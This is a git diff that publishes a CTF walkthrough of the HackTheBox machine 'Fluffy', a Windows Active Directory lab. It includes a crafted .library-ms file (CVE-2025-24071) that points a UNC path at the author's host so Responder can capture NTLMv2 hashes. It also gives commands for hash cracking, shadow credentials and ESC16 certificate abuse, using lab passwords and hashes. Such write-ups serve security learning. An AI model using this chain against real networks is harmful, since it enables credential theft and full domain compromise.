@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Fluffy - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Fluffy.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Fluffy machine from HackTheBox - Easy difficulty level">
+    <meta name="description" content="Detailed writeup for Fluffy machine from HackTheBox - Easy difficulty level">
     <meta name="keywords" content="HackTheBox, Fluffy, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,123 @@
         <h1 class="writeup-title">Fluffy</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">Active machine</span>
+            <span class="date">September 20, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Fluffy" src="../images/Fluffy/pwned.png" /></p>
-<p>Fluffy is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Fluffy retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Fluffy/pwned.png" /></p>
+<p>Fluffy was an easy-difficulty Windows Active Directory box that began with SMB share enumeration using provided credentials for J.Fleischman.
+Access to the IT share revealed system documentation detailing multiple vulnerabilities, including CVE-2025-24071, a critical vulnerability in Windows Explorer that causes it to automatically process .library-ms files whithin extracted archives.</p>
+<p>I exploited CVE-2025-24071 by crafting a malicious .library-ms file containing a UNC path pointing to my attacking machine, then uploading it within a ZIP archive to the IT share.
+When a user extracted the archive, Windows Explorer automatically processed the library file and initiated an NTLM authentication attempt to my system.
+Using Responder, I captured the NTLMv2 hash for P.AGILA and successfully cracked it to reveal the password "prometheusx-303".</p>
+<p>Post-compromise enumeration with BloodHound revealed that P.AGILA belonged to the Service Account Managers group, which had Generic All permissions over the Service Accounts group.
+This allowed me to add P.AGILA to the Service Accounts group, gaining Generic Write permissions over three service accounts: ca_svc, winrm_svc, and ldap_svc.
+I performed shadow credentials attacks against these accounts by modifying their msDS-KeyCredentialLink attributes, ultimately obtaining NTLM hashes through PKINIT authentication.</p>
+<p>Using the winrm_svc hash, I gained initial user access via Evil-WinRM. For privilege escalation, I leveraged ca_svc's membership in the Certificate Publishers group and discovered the Certificate Authority was vulnerable to ESC16 (security extension globally disabled).
+I manipulated ca_svc's UPN attribute to impersonate the administrator, requested a certificate from a standard User template, then authenticated using the certificate to obtain the administrator's NTLM hash, leading to full domain compromise.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Fluffy/nmap.png" /></p>
+<p>Initial nmap scan reveals a few interesting ports. The presence of <code>Simple DNS Plus</code>, Kerberos, as well as the domain name of <code>fluffy.htb</code> leads me to believe that I'll be dealing with an Active Directory scenario here.</p>
+<h2>Share enumeration</h2>
+<p>Since I was provided with credentials for J.Fleischman, I will begin by using netexec to check whether this user can access any non-standard shares.</p>
+<p><code>nxc smb DC01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares</code></p>
+<p><img alt="shares" src="../images/Fluffy/shares.png" /></p>
+<p>Joel has read/write permission over the non-standard IT share. I will use Impacket's smbclient script to browse through this share.</p>
+<p><code>impacket-smbclient -dc-ip 10.10.11.69 fluffy.htb/j.fleischman:'J0elTHEM4n1990!'@10.10.11.69</code></p>
+<p><img alt="smbclient" src="../images/Fluffy/smbclient.png" /></p>
+<p>The PDF document is an upgrade notice, which contains a list of vulnerabilities that the system is vulnerable to.</p>
+<p><img alt="document" src="../images/Fluffy/document.png" /></p>
+<h2>Capturing an NTLMv2 hash with CVE-2025-24071</h2>
+<p>I will check the critical CVEs first.</p>
+<p><code>CVE-2025-24996 | External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.</code></p>
+<p><code>https://nvd.nist.gov/vuln/detail/CVE-2025-24996</code></p>
+<p>While this vulnerability may exist on the target system, there's no guarantee that any user would take an interest in an arbitrary file in the IT share.</p>
+<p>On the other hand, <code>CVE-2025-24071</code> is a vulnerability in Windows Explorer itself. It'll automatically parse any <code>.library-ms</code> files it finds after unzipping an archive.</p>
+<p>There was a .zip archive in the IT share, along with its contents. This leads me to believe that if I upload an archive there, someone might unzip it and trigger the vulnerability.</p>
+<p>A <code>library-ms</code> file is a Library Description file, which contains information about a library stored in an XML format. I can create a malicious library-ms file by modifying an example one from Microsoft.</p>
+<p><code>https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry</code></p>
+<p><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+    &lt;name&gt;@shell32.dll,-34575&lt;/name&gt;
+    &lt;ownerSID&gt;S-1-5-21-379071477-2495173225-776587366-1000&lt;/ownerSID&gt;
+    &lt;version&gt;1&lt;/version&gt;
+    &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+    &lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt;
+    &lt;templateInfo&gt;
+        &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+    &lt;/templateInfo&gt;                                                                                                                                                                                                                         
+    &lt;searchConnectorDescriptionList&gt;                                                                                                                                                                                                        
+        &lt;searchConnectorDescription publisher="Microsoft" product="Windows"&gt;                                                                                                                                                                
+            &lt;description&gt;@shell32.dll,-34577&lt;/description&gt;                                                                                                                                                                                  
+            &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;                                                                                                                                                                             
+            &lt;simpleLocation&gt;                                                                                                                                                                                                                
+                &lt;url&gt;\\10.10.16.47\share&lt;/url&gt;                                                                                                                                                                                              
+            &lt;/simpleLocation&gt;                                                                                                                                                                                                               
+        &lt;/searchConnectorDescription&gt;                                                                                                                                                                                                       
+        &lt;searchConnectorDescription publisher="Microsoft" product="Windows"&gt;                                                                                                                                                                
+            &lt;description&gt;@shell32.dll,-34579&lt;/description&gt;                                                                                                                                                                                  
+            &lt;isDefaultNonOwnerSaveLocation&gt;true&lt;/isDefaultNonOwnerSaveLocation&gt;                                                                                                                                                             
+            &lt;simpleLocation&gt;                                                                                                                                                                                                                
+                &lt;url&gt;knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}&lt;/url&gt;                                                                                                                                                               
+                &lt;serialized&gt;MBAAAEAFCAAA...HJIfK9AAAAAA&lt;/serialized&gt;                                                                                                                                                                        
+            &lt;/simpleLocation&gt;                                                                                                                                                                                                               
+        &lt;/searchConnectorDescription&gt;                                                                                                                                                                                                       
+    &lt;/searchConnectorDescriptionList&gt;                                                                                                                                                                                                       
+&lt;/libraryDescription&gt;</code>
+I changed the simpleLocation URL value to my machine's IP. The path doesn't need to be valid as I only need an authentication attempt, which will be initiated even if the path is invalid.</p>
+<p><code>sudo responder -I tun0</code></p>
+<p>In a different terminal tab, I started up Responder to capture NTLMv2 hashes. I then once again used impacket-smbserver to upload the malicious archive into the IT share, the only file inside being the malicious library-ms file.</p>
+<p><img alt="upload" src="../images/Fluffy/upload.png" /></p>
+<p>A few seconds after I uploaded the file, Responder caught an NTLMv2 hash.</p>
+<p><img alt="hash" src="../images/Fluffy/hash.png" /></p>
+<p>I'll crack it with hashcat.</p>
+<p><code>hashcat -a 0 hash /usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="cracked" src="../images/Fluffy/cracked.png" /></p>
+<p><code>P.AGILA | prometheusx-303</code></p>
+<h2>Bloodhound enumeration</h2>
+<p>After owning P.AGILA, I decided to see what they could do on the domain with Bloodhound.</p>
+<p><code>bloodhound-python -c all -d fluffy.htb -u p.agila -p 'prometheusx-303' -dc DC01.fluffy.htb -ns 10.10.11.69 --zip</code></p>
+<p><img alt="bh1" src="../images/Fluffy/bh1.png" /></p>
+<p>P.AGILA is a member of the Service Account Managers group, which has Generic All over Service Accounts. This means that P.AGILA can add members and themselves to the Service Accounts group.</p>
+<p><img alt="bh2" src="../images/Fluffy/bh2.png" /></p>
+<p>The Service Accounts group has Generic Write over the 3 service accounts, meaning that its members can modify any attribute of these accounts.</p>
+<p><img alt="bh3" src="../images/Fluffy/bh3.png" /></p>
+<p>Ca_svc is a member of the cert publishers group.</p>
+<p><img alt="bh4" src="../images/Fluffy/bh4.png" /></p>
+<p>And winrm_svc is a member of the remote management users group.</p>
+<h2>Shadow credentials attack against the svc accounts</h2>
+<p>The shadow credentials attack works by writing into the <code>msDS-KeyCredentialLink</code> attribute of a target account. By adding a key credential pair to the account, it is then possible to perform Kerberos authentication as that account using PKINIT.</p>
+<p>First, I will add P.AGILA to the Service Accounts group, which will allow me to attack the 3 service accounts. I'll use bloodyad to add myself to the group.</p>
+<p><code>bloodyAD -d fluffy.htb -u p.agila -p 'prometheusx-303' --dc-ip 10.10.11.69 add groupMember 'Service Accounts' p.agila</code></p>
+<p>Then I will use certipy-ad to add shadow credentials to each account, ultimately returning their NTLM hashes.</p>
+<p><code>certipy-ad shadow auto -account winrm_svc -dc-ip 10.10.11.69 -dc-host DC01.fluffy.htb -u p.agila -p 'prometheusx-303'</code></p>
+<p><img alt="shadow" src="../images/Fluffy/shadow.png" /></p>
+<p>I'll take the hash of winrm_svc, and I will remote into the machine with it using evil-winrm.</p>
+<p><img alt="user" src="../images/Fluffy/user.png" /></p>
+<h1>Root flag</h1>
+<p>After getting the user flag, I moved my focus to the ca_svc account. I'll use certipy-ad to search for vulnerable certificate templates on the domain.</p>
+<h2>Abusing ESC16 on the fluffy-DC01-CA</h2>
+<p><code>certipy-ad find -enabled -vulnerable -dc-ip 10.10.11.69 -u ca_svc -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8"</code></p>
+<p><img alt="esc16" src="../images/Fluffy/esc16.png" /></p>
+<p><code>https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally</code></p>
+<p>The CA itself is vulnerable to ESC 16. In short, this means that every certificate issued by this CA will be vulnerable to ESC9(NO SECURITY EXTENSION).</p>
+<p>I will use the ca_svc user to enroll in the user certificate template. P.AGILA has GenericWrite over the svc account, which will allow me to change their UPN and impersonate the administrator.</p>
+<p>First, I'll change the UPN of ca_svc to administrator.</p>
+<p><code>certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn administrator -user ca_svc update</code></p>
+<p>Then I'll request a certificate from the user template. Since the account's UPN is now administrator, it should return an administrator.pfx file.</p>
+<p><code>certipy-ad req -ca fluffy-DC01-CA -template user -target 10.10.11.69 -u ca_svc -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8'</code></p>
+<p><img alt="admin" src="../images/Fluffy/admin.png" /></p>
+<p>Before using this certificate, I have to change the UPN of ca_svc to something other than administrator. Otherwise, it will be denied with a name-mismatch error, because there will be 2 accounts with the same UPN.</p>
+<p><code>certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user ca_svc update</code></p>
+<p>Now I'll authenticate as administrator with this new certificate.</p>
+<p><code>certipy-ad auth -pfx administrator.pfx -username administrator -dc-ip 10.10.11.69 -domain fluffy.htb</code></p>
+<p><img alt="auth" src="../images/Fluffy/auth.png" /></p>
+<p>I will take this hash and I'll use it with evil-winrm to remote into the machine as the administrator.</p>
+<p><img alt="root" src="../images/Fluffy/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
